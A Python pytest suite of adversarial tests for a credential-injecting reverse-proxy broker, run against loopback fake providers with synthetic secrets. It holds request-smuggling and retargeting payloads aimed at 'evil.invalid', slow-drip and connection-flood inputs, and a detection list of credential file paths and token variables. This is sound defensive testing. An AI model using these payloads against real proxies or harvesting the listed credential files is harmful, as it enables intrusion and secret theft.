"""Adversarial tests for Protocol 2's external credential broker."""

from __future__ import annotations

import base64
import copy
import hashlib
import http.client
import io
import ipaddress
import json
import os
import shutil
import socket
import subprocess
import tarfile
import threading
import time
from collections.abc import Iterator, Mapping, Sequence
from contextlib import contextmanager
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import ClassVar
from urllib.parse import quote_from_bytes
from uuid import uuid4

import pytest

import stinger.adapters.credential_broker as broker_controller
import stinger.credential_broker_server as broker_server
from stinger.benchmark.credential_broker import (
    BROKER_ALIAS,
    BROKER_AUDIT_PATH,
    BROKER_CONFIG_PATH,
    BROKER_LEASE_ENV,
    BROKER_RAW_CREDENTIAL_ENV,
    BROKER_SERVER_PATH,
    CredentialBrokerConfiguration,
    canonical_json_bytes,
)
from stinger.benchmark.protocol import ProviderId
from stinger.config import AgentConfig
from stinger.docker_runtime import DockerRuntimeIdentity, observe_docker_runtime

REPOSITORY = Path(__file__).resolve().parents[1]
DOCKER_TEST_IMAGE = "stinger-runner:1"
REQUIRE_REAL_DOCKER_TESTS_ENV = "STINGER_REQUIRE_REAL_DOCKER_TESTS"
RAW_CREDENTIAL = "synthetic/raw+provider=credential%value-0123456789~~~???"
BROKER_LEASE = "synthetic-opaque-broker-lease-abcdefghijklmnopqrstuvwxyz"
APPROVED_AGENT_PATH = "/openai/v1/responses"
APPROVED_UPSTREAM_PATH = "/v1/responses"


def _sha256(value: bytes) -> str:
    return hashlib.sha256(value).hexdigest()


def _test_configuration(
    upstream_origin: str,
    *,
    lease: str = BROKER_LEASE,
    provider: str = "openai",
) -> dict[str, object]:
    """Return one closed test-only route to a local fake provider."""
    if provider == "openai":
        agent_base_url = f"http://{BROKER_ALIAS}:8765/openai/v1"
        agent_path = APPROVED_AGENT_PATH
        upstream_path = APPROVED_UPSTREAM_PATH
        forwarded_headers = ["accept", "content-type", "user-agent"]
        injected_auth_header = "authorization"
        injected_auth_scheme = "bearer"
    elif provider == "anthropic":
        agent_base_url = f"http://{BROKER_ALIAS}:8765/anthropic"
        agent_path = "/anthropic/v1/messages"
        upstream_path = "/v1/messages"
        forwarded_headers = [
            "accept",
            "anthropic-beta",
            "anthropic-version",
            "content-type",
            "user-agent",
        ]
        injected_auth_header = "x-api-key"
        injected_auth_scheme = "raw"
    else:
        raise ValueError("test provider is invalid")
    return {
        "format_version": "1",
        "configuration_sha256": "1" * 64,
        "provider": provider,
        "agent_base_url": agent_base_url,
        "upstream_https_origin": upstream_origin,
        "path_mappings": [
            {
                "agent_path": agent_path,
                "upstream_path": upstream_path,
                "methods": ["POST"],
            }
        ],
        "forwarded_agent_headers": forwarded_headers,
        "stripped_agent_headers": [
            "authorization",
            "cookie",
            "host",
            "proxy-authorization",
            "x-api-key",
        ],
        "injected_auth_header": injected_auth_header,
        "injected_auth_scheme": injected_auth_scheme,
        "lease_sha256": _sha256(lease.encode("utf-8")),
        "test_only_allow_http": True,
    }


def _production_configuration(provider: str = "openai") -> dict[str, object]:
    """Return exact production fields compiled into the broker source."""
    route = copy.deepcopy(broker_server.PRODUCTION_ROUTE_CONFIGS[provider])
    return {
        "format_version": "1",
        "configuration_sha256": "2" * 64,
        "provider": provider,
        **route,
        "lease_sha256": "3" * 64,
        "test_only_allow_http": False,
    }


def _write_configuration(path: Path, payload: object) -> None:
    path.write_bytes(canonical_json_bytes(payload))


def _audit_events(path: Path) -> list[dict[str, object]]:
    """Load canonical broker audit events and reject ambiguous test evidence."""
    events: list[dict[str, object]] = []
    for line in path.read_bytes().splitlines(keepends=True):
        value = json.loads(line)
        assert isinstance(value, dict)
        assert line == canonical_json_bytes(value)
        events.append(value)
    return events


class _FakeProviderHandler(BaseHTTPRequestHandler):
    """Record what the broker injected into a local, synthetic provider."""

    response_body: ClassVar[bytes] = b'{"provider":"ok"}\n'
    response_headers: ClassVar[tuple[tuple[str, str], ...]] = ()
    response_chunk_delay_seconds: ClassVar[float] = 0
    observations: ClassVar[list[dict[str, object]]]
    observation_lock: ClassVar[threading.Lock]

    def do_POST(self) -> None:  # noqa: N802
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length)
        observation = {
            "authorization": self.headers.get("Authorization"),
            "body": body.decode("utf-8"),
            "headers": {name.lower(): value for name, value in self.headers.items()},
            "path": self.path,
            "x_api_key": self.headers.get("X-Api-Key"),
        }
        with self.observation_lock:
            self.observations.append(observation)
        self.send_response(200)
        for name, value in self.response_headers:
            self.send_header(name, value)
        self.end_headers()
        if self.response_chunk_delay_seconds:
            for value in self.response_body:
                try:
                    self.wfile.write(bytes((value,)))
                    self.wfile.flush()
                except OSError:
                    break
                time.sleep(self.response_chunk_delay_seconds)
        else:
            self.wfile.write(self.response_body)

    def log_message(self, format: str, *args: object) -> None:
        """Keep synthetic request details out of test output."""


@dataclass(frozen=True, slots=True)
class _LocalBroker:
    """Running in-process broker and fake-provider test fixture."""

    port: int
    audit_path: Path
    observations: list[dict[str, object]]
    raw_credential: str
    lease: str
    server: broker_server.CredentialBrokerHTTPServer
    agent_path: str
    lease_header: str
    lease_scheme: str

    def request(
        self,
        *,
        method: str = "POST",
        target: str | None = None,
        headers: Mapping[str, str] | None = None,
        body: bytes = b'{"input":"synthetic"}',
    ) -> tuple[int, list[tuple[str, str]], bytes]:
        lease_value = self.lease
        if self.lease_scheme == "bearer":
            lease_value = f"Bearer {lease_value}"
        request_headers = {
            self.lease_header: lease_value,
            "Content-Type": "application/json",
            "Host": f"{BROKER_ALIAS}:8765",
            **(dict(headers) if headers is not None else {}),
        }
        connection = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        try:
            connection.request(
                method, target or self.agent_path, body=body, headers=request_headers
            )
            response = connection.getresponse()
            return response.status, response.getheaders(), response.read()
        finally:
            connection.close()


@contextmanager
def _running_local_broker(
    tmp_path: Path,
    *,
    raw_credential: str = RAW_CREDENTIAL,
    response_body: bytes = b'{"provider":"ok"}\n',
    response_headers: tuple[tuple[str, str], ...] = (),
    response_chunk_delay_seconds: float = 0,
    client_timeout_seconds: float | None = None,
    absolute_timeout_seconds: float | None = None,
    provider_name: str = "openai",
) -> Iterator[_LocalBroker]:
    """Run the real broker handler against a loopback-only fake provider."""

    observations: list[dict[str, object]] = []

    class ProviderHandler(_FakeProviderHandler):
        pass

    ProviderHandler.response_body = response_body
    ProviderHandler.response_headers = response_headers
    ProviderHandler.response_chunk_delay_seconds = response_chunk_delay_seconds
    ProviderHandler.observations = observations
    ProviderHandler.observation_lock = threading.Lock()
    provider = ThreadingHTTPServer(("127.0.0.1", 0), ProviderHandler)
    provider.daemon_threads = True
    provider_thread = threading.Thread(target=provider.serve_forever, daemon=True)
    provider_thread.start()

    root = tmp_path / uuid4().hex
    root.mkdir()
    config_path = root / "config.json"
    audit_path = root / "audit.jsonl"
    config = _test_configuration(
        f"http://127.0.0.1:{provider.server_address[1]}",
        provider=provider_name,
    )
    _write_configuration(config_path, config)
    loaded, configuration_bytes_sha256 = broker_server._load_configuration_with_identity(
        config_path,
        test_only_authorized=True,
    )
    audit_path.write_bytes(
        canonical_json_bytes(
            {
                "agent_base_url": loaded["agent_base_url"],
                "allowed_destination_inventory_sha256": (
                    broker_server._allowed_destination_inventory_sha256(loaded)
                ),
                "client_socket_timeout_seconds": broker_server.CLIENT_SOCKET_TIMEOUT_SECONDS,
                "connection_deadline_seconds": broker_server.CONNECTION_DEADLINE_SECONDS,
                "configuration_bytes_sha256": configuration_bytes_sha256,
                "configuration_sha256": loaded["configuration_sha256"],
                "decision": "ready",
                "listen": "127.0.0.1:test",
                "max_concurrent_connections": broker_server.MAX_CONCURRENT_CONNECTIONS,
                "provider": loaded["provider"],
                "test_only_allow_http": True,
                "upstream_https_origin": loaded["upstream_https_origin"],
                "upstream_socket_timeout_seconds": (broker_server.UPSTREAM_SOCKET_TIMEOUT_SECONDS),
            }
        )
    )

    class BrokerHandler(broker_server.CredentialBrokerHandler):
        pass

    if client_timeout_seconds is not None:
        BrokerHandler.timeout = client_timeout_seconds
    if absolute_timeout_seconds is not None:
        BrokerHandler.absolute_timeout_seconds = absolute_timeout_seconds
    BrokerHandler.config = loaded
    BrokerHandler.configuration_bytes_sha256 = configuration_bytes_sha256
    BrokerHandler.raw_credential = raw_credential
    BrokerHandler.lease = BROKER_LEASE
    BrokerHandler.audit_path = audit_path
    BrokerHandler.audit_lock = threading.Lock()
    BrokerHandler.request_sequence = 0
    BrokerHandler.upstream_connections = set()
    BrokerHandler.upstream_lock = threading.Lock()
    broker = broker_server.CredentialBrokerHTTPServer(("127.0.0.1", 0), BrokerHandler)
    broker_thread = threading.Thread(target=broker.serve_forever, daemon=True)
    broker_thread.start()
    try:
        yield _LocalBroker(
            port=broker.server_address[1],
            audit_path=audit_path,
            observations=observations,
            raw_credential=raw_credential,
            lease=BROKER_LEASE,
            server=broker,
            agent_path=str(loaded["path_mappings"][0]["agent_path"]),
            lease_header=str(loaded["injected_auth_header"]),
            lease_scheme=str(loaded["injected_auth_scheme"]),
        )
    finally:
        BrokerHandler.cancel_active_upstreams()
        broker.close_active_connections()
        broker.shutdown()
        broker.server_close()
        broker_thread.join(timeout=5)
        provider.shutdown()
        provider.server_close()
        provider_thread.join(timeout=5)


def _raw_request(port: int, request: bytes) -> tuple[int, bytes]:
    """Send exact HTTP bytes so duplicate and malformed headers remain adversarial."""
    with socket.create_connection(("127.0.0.1", port), timeout=5) as connection:
        connection.sendall(request)
        connection.shutdown(socket.SHUT_WR)
        chunks: list[bytes] = []
        while chunk := connection.recv(64 * 1024):
            chunks.append(chunk)
    response = b"".join(chunks)
    status_line = response.split(b"\r\n", 1)[0]
    return int(status_line.split()[1]), response


def _request_bytes(
    *,
    method: str = "POST",
    target: str = APPROVED_AGENT_PATH,
    headers: Sequence[tuple[str, str]] = (),
    body: bytes = b"{}",
) -> bytes:
    base_headers = [
        ("Host", f"{BROKER_ALIAS}:8765"),
        ("Authorization", f"Bearer {BROKER_LEASE}"),
        ("Content-Type", "application/json"),
        ("Content-Length", str(len(body))),
    ]
    encoded_headers = b"".join(
        f"{name}: {value}\r\n".encode("ascii") for name, value in (*base_headers, *headers)
    )
    return f"{method} {target} HTTP/1.1\r\n".encode("ascii") + encoded_headers + b"\r\n" + body


def test_configuration_requires_canonical_closed_schema(tmp_path: Path) -> None:
    """Whitespace drift, extra keys, and non-boolean test mode fail before listening."""
    payload = _test_configuration("http://127.0.0.1:12345")
    path = tmp_path / "config.json"
    _write_configuration(path, payload)
    assert broker_server._load_configuration(path, test_only_authorized=True) == payload

    with pytest.raises(broker_server.BrokerConfigurationError, match="process authorization"):
        broker_server._load_configuration(path)

    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    with pytest.raises(broker_server.BrokerConfigurationError, match="canonical JSON"):
        broker_server._load_configuration(path, test_only_authorized=True)

    extra = {**payload, "proxy_url": "http://evil.invalid:80"}
    _write_configuration(path, extra)
    with pytest.raises(broker_server.BrokerConfigurationError, match="schema is not exact"):
        broker_server._load_configuration(path, test_only_authorized=True)

    wrong_type = {**payload, "test_only_allow_http": 1}
    _write_configuration(path, wrong_type)
    with pytest.raises(broker_server.BrokerConfigurationError, match="must be boolean"):
        broker_server._load_configuration(path, test_only_authorized=True)


@pytest.mark.parametrize(
    "case",
    (
        "method",
        "path-traversal",
        "upstream-path-query",
        "duplicate-path",
        "origin-userinfo",
        "origin-path",
        "forward-hop-header",
        "missing-auth-strip",
        "overlapping-headers",
    ),
)
def test_configuration_rejects_open_or_ambiguous_test_routes(
    tmp_path: Path,
    case: str,
) -> None:
    """Even test-only HTTP mode remains a fixed-origin POST-only reverse proxy."""
    payload = _test_configuration("http://127.0.0.1:12345")
    mappings = payload["path_mappings"]
    assert isinstance(mappings, list)
    mapping = mappings[0]
    assert isinstance(mapping, dict)
    if case == "method":
        mapping["methods"] = ["POST", "GET"]
    elif case == "path-traversal":
        mapping["agent_path"] = "/openai/v1/../admin"
    elif case == "upstream-path-query":
        mapping["upstream_path"] = "/v1/responses?redirect=evil"
    elif case == "duplicate-path":
        mappings.append(copy.deepcopy(mapping))
    elif case == "origin-userinfo":
        payload["upstream_https_origin"] = "http://user@127.0.0.1:12345"
    elif case == "origin-path":
        payload["upstream_https_origin"] = "http://127.0.0.1:12345/redirect"
    elif case == "forward-hop-header":
        payload["forwarded_agent_headers"] = ["connection", "content-type"]
    elif case == "missing-auth-strip":
        payload["stripped_agent_headers"] = ["proxy-authorization", "x-api-key"]
    elif case == "overlapping-headers":
        payload["forwarded_agent_headers"] = ["content-type", "x-api-key"]
    path = tmp_path / f"{case}.json"
    _write_configuration(path, payload)
    with pytest.raises(broker_server.BrokerConfigurationError):
        broker_server._load_configuration(path, test_only_authorized=True)


@pytest.mark.parametrize(
    ("provider", "field", "replacement"),
    (
        ("openai", "agent_base_url", "http://stinger-credential-broker:8765/other"),
        ("openai", "upstream_https_origin", "https://example.invalid:443"),
        ("openai", "path_mappings", []),
        ("anthropic", "injected_auth_scheme", "bearer"),
    ),
)
def test_production_routes_match_the_compiled_allowlist_exactly(
    tmp_path: Path,
    provider: str,
    field: str,
    replacement: object,
) -> None:
    """A syntactically valid production destination cannot drift from the allowlist."""
    exact = _production_configuration(provider)
    exact_path = tmp_path / f"{provider}-exact.json"
    _write_configuration(exact_path, exact)
    assert broker_server._load_configuration(exact_path) == exact

    drifted = {**exact, field: replacement}
    drifted_path = tmp_path / f"{provider}-{field}.json"
    _write_configuration(drifted_path, drifted)
    with pytest.raises(broker_server.BrokerConfigurationError):
        broker_server._load_configuration(drifted_path)


def test_approved_request_injects_raw_credential_only_at_fake_provider(
    tmp_path: Path,
) -> None:
    """The agent lease is replaced by the synthetic credential at one fixed upstream."""
    with _running_local_broker(tmp_path) as broker:
        status, _, body = broker.request(headers={"X-Unapproved-Agent-Header": "drop-me"})
        assert status == 200
        assert body == b'{"provider":"ok"}\n'
        assert broker.raw_credential.encode() not in body
        assert len(broker.observations) == 1
        observed = broker.observations[0]
        assert observed["path"] == APPROVED_UPSTREAM_PATH
        assert observed["authorization"] == f"Bearer {broker.raw_credential}"
        assert broker.lease not in json.dumps(observed, sort_keys=True)
        headers = observed["headers"]
        assert isinstance(headers, dict)
        assert "x-unapproved-agent-header" not in headers
        assert _audit_events(broker.audit_path)[-1]["decision"] == "allowed"


def test_anthropic_request_replaces_opaque_lease_with_x_api_key(
    tmp_path: Path,
) -> None:
    """The second signed provider route injects only its exact Anthropic auth form."""
    with _running_local_broker(tmp_path, provider_name="anthropic") as broker:
        status, _, body = broker.request(
            headers={
                "Anthropic-Version": "2023-06-01",
                "Anthropic-Beta": "synthetic-feature",
            }
        )
        assert status == 200
        assert body == b'{"provider":"ok"}\n'
        assert len(broker.observations) == 1
        observed = broker.observations[0]
        assert observed["path"] == "/v1/messages"
        assert observed["authorization"] is None
        assert observed["x_api_key"] == broker.raw_credential
        assert broker.lease not in json.dumps(observed, sort_keys=True)
        assert _audit_events(broker.audit_path)[-1]["decision"] == "allowed"


def _encoded_secret(kind: str, raw: bytes) -> bytes:
    if kind == "raw":
        return raw
    if kind == "hex":
        return raw.hex().encode("ascii")
    if kind == "upper-hex":
        return raw.hex().upper().encode("ascii")
    if kind == "base64":
        return base64.b64encode(raw)
    if kind == "base64-unpadded":
        return base64.b64encode(raw).rstrip(b"=")
    if kind == "urlsafe-base64":
        return base64.urlsafe_b64encode(raw)
    if kind == "urlsafe-base64-unpadded":
        return base64.urlsafe_b64encode(raw).rstrip(b"=")
    if kind == "percent":
        return quote_from_bytes(raw, safe="").encode("ascii")
    if kind == "lower-percent":
        return quote_from_bytes(raw, safe="").lower().encode("ascii")
    if kind == "path-percent":
        return quote_from_bytes(raw).encode("ascii")
    if kind == "lower-path-percent":
        return quote_from_bytes(raw).lower().encode("ascii")
    raise AssertionError(f"unsupported encoding fixture: {kind}")


@pytest.mark.parametrize(
    "encoding",
    (
        "raw",
        "hex",
        "upper-hex",
        "base64",
        "base64-unpadded",
        "urlsafe-base64",
        "urlsafe-base64-unpadded",
        "percent",
        "lower-percent",
        "path-percent",
        "lower-path-percent",
    ),
)
def test_reflected_raw_or_reversibly_encoded_credential_is_rejected(
    tmp_path: Path,
    encoding: str,
) -> None:
    """Provider responses cannot turn the broker into a credential read primitive."""
    reflected = _encoded_secret(encoding, RAW_CREDENTIAL.encode("utf-8"))
    with _running_local_broker(
        tmp_path,
        response_body=b'{"reflection":"' + reflected + b'"}\n',
    ) as broker:
        status, _, body = broker.request()
        assert status == 502
        assert reflected not in body
        event = _audit_events(broker.audit_path)[-1]
        assert event["decision"] == "rejected"
        assert event["reason"] == "upstream reflected provider credential"


def test_reflected_credential_in_upstream_header_is_rejected(tmp_path: Path) -> None:
    """Response-header reflection is held to the same non-disclosure rule as the body."""
    reflected = base64.b64encode(RAW_CREDENTIAL.encode()).decode("ascii")
    with _running_local_broker(
        tmp_path,
        response_headers=(("X-Provider-Debug", reflected),),
    ) as broker:
        status, headers, body = broker.request()
        assert status == 502
        assert reflected.encode() not in body
        assert all(reflected not in value for _, value in headers)
        assert _audit_events(broker.audit_path)[-1]["decision"] == "rejected"


def test_duplicate_upstream_content_length_is_not_forwarded(tmp_path: Path) -> None:
    """The broker emits exactly one self-computed downstream content length."""
    response = b'{"provider":"ok"}\n'
    duplicate = (("Content-Length", str(len(response))),) * 2
    with _running_local_broker(
        tmp_path,
        response_body=response,
        response_headers=duplicate,
    ) as broker:
        status, headers, body = broker.request()
        assert status == 200
        assert body == response
        assert [value for name, value in headers if name.lower() == "content-length"] == [
            str(len(response))
        ]


@pytest.mark.parametrize("method", ("HEAD", "TRACE", "BREW"))
def test_unsupported_methods_are_rejected_and_audited(
    tmp_path: Path,
    method: str,
) -> None:
    """Explicit and arbitrary unsupported verbs leave canonical rejection evidence."""
    with _running_local_broker(tmp_path) as broker:
        status, _ = _raw_request(
            broker.port,
            _request_bytes(method=method, body=b""),
        )
        assert status == 405
        event = _audit_events(broker.audit_path)[-1]
        assert event["decision"] == "rejected"
        assert event["method"] == method


def test_malformed_parser_request_is_rejected_and_audited(tmp_path: Path) -> None:
    """Parser-level failures cannot disappear from the receipt's request inventory."""
    with _running_local_broker(tmp_path) as broker:
        status, response = _raw_request(
            broker.port,
            b"POST /openai/v1/responses EXTRA HTTP/1.1\r\n\r\n",
        )
        assert status == 400
        assert b"EXTRA HTTP/1.1" not in response
        event = _audit_events(broker.audit_path)[-1]
        assert event["decision"] == "rejected"
        assert event["reason"] == "HTTP request parsing or method failed closed"


@pytest.mark.parametrize(
    ("name", "request_bytes", "expected_status"),
    (
        (
            "wrong-host",
            _request_bytes(headers=(("Host", "evil.invalid"),)),
            403,
        ),
        (
            "unapproved-path",
            _request_bytes(target="/openai/v1/not-allowlisted"),
            403,
        ),
        (
            "path-traversal",
            _request_bytes(target="/openai/v1/../admin"),
            403,
        ),
        (
            "absolute-form-router",
            _request_bytes(target="http://evil.invalid:80/steal"),
            403,
        ),
        (
            "connect-tunnel",
            _request_bytes(method="CONNECT", target="evil.invalid:443", body=b""),
            405,
        ),
        (
            "duplicate-authorization",
            _request_bytes(headers=(("Authorization", f"Bearer {BROKER_LEASE}"),)),
            403,
        ),
        (
            "duplicate-content-length",
            _request_bytes(headers=(("Content-Length", "2"),)),
            403,
        ),
        (
            "proxy-authorization",
            _request_bytes(headers=(("Proxy-Authorization", "Basic synthetic"),)),
            403,
        ),
        (
            "hop-by-hop-connection",
            _request_bytes(headers=(("Connection", "keep-alive"),)),
            403,
        ),
        (
            "transfer-encoding",
            _request_bytes(headers=(("Transfer-Encoding", "chunked"),)),
            403,
        ),
    ),
)
def test_host_path_connect_and_header_smuggling_attempts_fail_closed(
    tmp_path: Path,
    name: str,
    request_bytes: bytes,
    expected_status: int,
) -> None:
    """The broker cannot be retargeted, tunneled through, or ambiguously parsed."""
    del name
    with _running_local_broker(tmp_path) as broker:
        status, _ = _raw_request(broker.port, request_bytes)
        assert status == expected_status
        event = _audit_events(broker.audit_path)[-1]
        assert event["decision"] == "rejected"
        assert not broker.observations


def test_obsolete_header_folding_is_rejected_and_audited(tmp_path: Path) -> None:
    """A folded forwarded header cannot smuggle a second header upstream."""
    request = (
        f"POST {APPROVED_AGENT_PATH} HTTP/1.1\r\n"
        f"Host: {BROKER_ALIAS}:8765\r\n"
        f"Authorization: Bearer {BROKER_LEASE}\r\n"
        "Content-Type: application/json\r\n"
        " X-Smuggled: value\r\n"
        "Content-Length: 2\r\n"
        "\r\n"
        "{}"
    ).encode("ascii")
    with _running_local_broker(tmp_path) as broker:
        status, _ = _raw_request(broker.port, request)
        assert status == 403
        event = _audit_events(broker.audit_path)[-1]
        assert event["decision"] == "rejected"
        assert not broker.observations


def test_content_length_overflow_is_rejected_and_audited(tmp_path: Path) -> None:
    """An oversized declared body fails before any upstream connection."""
    request = _request_bytes(body=b"").replace(
        b"Content-Length: 0\r\n",
        f"Content-Length: {broker_server.MAX_REQUEST_BYTES + 1}\r\n".encode("ascii"),
    )
    with _running_local_broker(tmp_path) as broker:
        status, _ = _raw_request(broker.port, request)
        assert status == 403
        event = _audit_events(broker.audit_path)[-1]
        assert event["decision"] == "rejected"
        assert event["reason"] == "request body exceeds the broker limit"
        assert not broker.observations


def test_incomplete_request_body_times_out_and_is_audited(tmp_path: Path) -> None:
    """A malicious partial body cannot hold a non-daemon broker thread forever."""
    with _running_local_broker(tmp_path, client_timeout_seconds=0.1) as broker:
        request = _request_bytes(body=b"{}").replace(
            b"Content-Length: 2\r\n",
            b"Content-Length: 100\r\n",
        )
        started = time.monotonic()
        with socket.create_connection(("127.0.0.1", broker.port), timeout=3) as connection:
            connection.sendall(request)
            response = connection.recv(64 * 1024)
        assert time.monotonic() - started < 2
        assert response.startswith(b"HTTP/1.1 403")
        event = _audit_events(broker.audit_path)[-1]
        assert event["decision"] == "rejected"
        assert event["reason"] == "request body read timed out"
        assert not broker.observations


@pytest.mark.parametrize(
    "partial",
    (
        b"POST /openai/v1/responses HTTP/1.1",
        b"POST /openai/v1/responses HTTP/1.1\r\nHost: stinger-credential-broker",
    ),
)
def test_absolute_deadline_audits_partial_request_line_or_headers(
    tmp_path: Path,
    partial: bytes,
) -> None:
    """Slow parser inputs cannot outlive the source-pinned absolute deadline."""
    with _running_local_broker(
        tmp_path,
        client_timeout_seconds=1,
        absolute_timeout_seconds=0.1,
    ) as broker:
        started = time.monotonic()
        with socket.create_connection(("127.0.0.1", broker.port), timeout=2) as connection:
            connection.sendall(partial)
            try:
                closed = connection.recv(1)
            except OSError:
                closed = b""
            assert closed == b""
        assert time.monotonic() - started < 1
        event = _audit_events(broker.audit_path)[-1]
        assert event["decision"] == "rejected"
        assert event["reason"] == "absolute connection deadline exceeded"


def test_absolute_deadline_stops_slow_drip_body(tmp_path: Path) -> None:
    """Bytes arriving inside the inactivity timeout cannot extend total connection life."""
    with _running_local_broker(
        tmp_path,
        client_timeout_seconds=1,
        absolute_timeout_seconds=0.15,
    ) as broker:
        request = _request_bytes(body=b"").replace(
            b"Content-Length: 0\r\n\r\n",
            b"Content-Length: 100\r\n\r\n",
        )
        started = time.monotonic()
        with socket.create_connection(("127.0.0.1", broker.port), timeout=2) as connection:
            connection.sendall(request)
            for _ in range(20):
                try:
                    connection.sendall(b"x")
                except OSError:
                    break
                time.sleep(0.03)
            try:
                closed = connection.recv(1)
            except OSError:
                closed = b""
            assert closed == b""
        assert time.monotonic() - started < 1
        event = _audit_events(broker.audit_path)[-1]
        assert event["decision"] == "rejected"
        assert event["reason"] == "absolute connection deadline exceeded"
        assert not broker.observations


def test_absolute_deadline_stops_slow_drip_upstream(tmp_path: Path) -> None:
    """An approved streaming provider cannot keep a credentialed worker alive forever."""
    with _running_local_broker(
        tmp_path,
        response_body=b"x" * 20,
        response_chunk_delay_seconds=0.03,
        client_timeout_seconds=1,
        absolute_timeout_seconds=0.15,
    ) as broker:
        connection = http.client.HTTPConnection("127.0.0.1", broker.port, timeout=2)
        started = time.monotonic()
        try:
            connection.request(
                "POST",
                APPROVED_AGENT_PATH,
                body=b"{}",
                headers={
                    "Authorization": f"Bearer {broker.lease}",
                    "Content-Type": "application/json",
                    "Host": f"{BROKER_ALIAS}:8765",
                },
            )
            try:
                response = connection.getresponse()
                response.read()
            except (http.client.HTTPException, OSError):
                pass
        finally:
            connection.close()
        assert time.monotonic() - started < 1
        assert len(broker.observations) == 1
        events = _audit_events(broker.audit_path)
        assert any(
            event["decision"] == "rejected"
            and event["reason"] == "absolute connection deadline exceeded"
            for event in events
        )


def test_connection_worker_limit_rejects_before_spawning_an_extra_thread(
    tmp_path: Path,
) -> None:
    """A malicious agent cannot create an unbounded number of broker workers."""
    connections: list[socket.socket] = []
    with _running_local_broker(
        tmp_path,
        client_timeout_seconds=5,
        absolute_timeout_seconds=5,
    ) as broker:
        try:
            for _ in range(broker_server.MAX_CONCURRENT_CONNECTIONS + 1):
                connection = socket.create_connection(("127.0.0.1", broker.port), timeout=2)
                connection.sendall(b"P")
                connections.append(connection)
            deadline = time.monotonic() + 2
            counts = broker.server.connection_counts()
            while counts[1] != 1 and time.monotonic() < deadline:
                time.sleep(0.01)
                counts = broker.server.connection_counts()
            assert counts == (broker_server.MAX_CONCURRENT_CONNECTIONS, 1, 32)
            try:
                closed = connections[-1].recv(1)
            except OSError:
                closed = b""
            assert closed == b""
        finally:
            for connection in connections:
                connection.close()


def test_pipelined_second_request_is_not_processed(tmp_path: Path) -> None:
    """Connection closure after one request prevents lease reuse by HTTP pipelining."""
    with _running_local_broker(tmp_path) as broker:
        request = _request_bytes() + _request_bytes(target="/openai/v1/not-allowlisted")
        with socket.create_connection(("127.0.0.1", broker.port), timeout=3) as connection:
            connection.sendall(request)
            connection.shutdown(socket.SHUT_WR)
            chunks: list[bytes] = []
            while chunk := connection.recv(64 * 1024):
                chunks.append(chunk)
        assert b"".join(chunks).count(b"HTTP/1.1") == 1
        assert len(broker.observations) == 1
        assert [event["decision"] for event in _audit_events(broker.audit_path)[-2:]] == [
            "attempt",
            "allowed",
        ]


def _runtime_identity() -> DockerRuntimeIdentity:
    return DockerRuntimeIdentity(
        client_path="/usr/bin/docker",
        client_sha256="1" * 64,
        client_version="1.0",
        context_name="default",
        context_endpoint="unix:///synthetic/docker.sock",
        context_endpoint_sha256="2" * 64,
        server_platform="linux",
        server_version="1.0",
        server_api_version="1.0",
        server_os="linux",
        server_arch="amd64",
    )


def _controller_session(
    monkeypatch: pytest.MonkeyPatch,
) -> broker_controller.CredentialBrokerSession:
    monkeypatch.setenv("OPENAI_API_KEY", RAW_CREDENTIAL)
    digest = "sha256:" + "9" * 64
    config = AgentConfig(
        adapter="codex",
        model="synthetic-model",
        provider=ProviderId.OPENAI,
        api_key_env="OPENAI_API_KEY",
        container_image=digest,
        container_image_digest=digest,
        credential_broker=CredentialBrokerConfiguration(
            image=digest,
            image_digest=digest,
        ),
    )
    session = broker_controller.CredentialBrokerSession(
        config,
        runtime=_runtime_identity(),
        repository=REPOSITORY,
    )
    session._image_environment = {}
    session._broker_image_environment = {}
    return session


@pytest.mark.parametrize(
    "name",
    (
        "CLAUDE_CODE_OAUTH_TOKEN",
        "GITHUB_TOKEN",
        "AWS_SESSION_TOKEN",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "HTTPS_PROXY",
    ),
)
def test_controller_rejects_extra_credential_and_proxy_environment_names(
    monkeypatch: pytest.MonkeyPatch,
    name: str,
) -> None:
    """Credential-like image or runtime environment additions fail closed."""
    session = _controller_session(monkeypatch)
    with pytest.raises(broker_controller.CredentialBrokerError, match="credential or routing"):
        session._reject_baked_credential_environment({name: "synthetic-value"})
    with pytest.raises(broker_controller.CredentialBrokerError, match="credential or routing"):
        session._reject_extra_runtime_credentials({name: "synthetic-value"})


def test_controller_rejects_ambiguous_environment_and_credential_paths() -> None:
    """Duplicate environment names and common credential-file locations are closed."""
    for raw in (["A=1", "A=2"], ["NO_SEPARATOR"], [1]):
        with pytest.raises(broker_controller.CredentialBrokerError):
            broker_controller._environment_mapping(raw)
    assert broker_controller._environment_mapping(["A=1", "B=2"]) == {
        "A": "1",
        "B": "2",
    }

    for path in (
        "credentials/provider.json",
        "tmp/.CLAUDE.JSON",
        "tmp/.claude.json",
        "root/.codex/auth.json",
        "home/agent/.claude/session.json",
        "root/.aws/credentials",
        "root/.config/gcloud/application_default_credentials.json",
        "root/.config/gh/hosts.yml",
        "root/.netrc",
    ):
        assert broker_controller._is_known_credential_path(path)
    for path in ("/absolute", "../escape", "a//b", "a/./b"):
        with pytest.raises(broker_controller.CredentialBrokerError):
            broker_controller._canonical_archive_path(path)


def _write_tar(path: Path, members: Sequence[tuple[str, bytes]]) -> None:
    with tarfile.open(path, "w") as archive:
        for name, content in members:
            info = tarfile.TarInfo(name)
            info.mode = 0o600
            info.size = len(content)
            archive.addfile(info, io.BytesIO(content))


@pytest.mark.parametrize(
    "encoding",
    (
        "raw",
        "hex",
        "upper-hex",
        "base64",
        "base64-unpadded",
        "urlsafe-base64",
        "urlsafe-base64-unpadded",
        "percent",
        "lower-percent",
        "path-percent",
        "lower-path-percent",
    ),
)
def test_controller_rejects_encoded_secret_in_agent_image_rootfs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    encoding: str,
) -> None:
    """A reversible representation baked into an ordinary image file is still exposure."""
    session = _controller_session(monkeypatch)
    archive = tmp_path / f"{encoding}.tar"
    encoded = _encoded_secret(encoding, RAW_CREDENTIAL.encode("utf-8"))
    _write_tar(archive, (("opt/application/data.bin", b"prefix-" + encoded + b"-suffix"),))
    with pytest.raises(broker_controller.CredentialBrokerError, match="credential"):
        session._scan_rootfs_archive(archive)


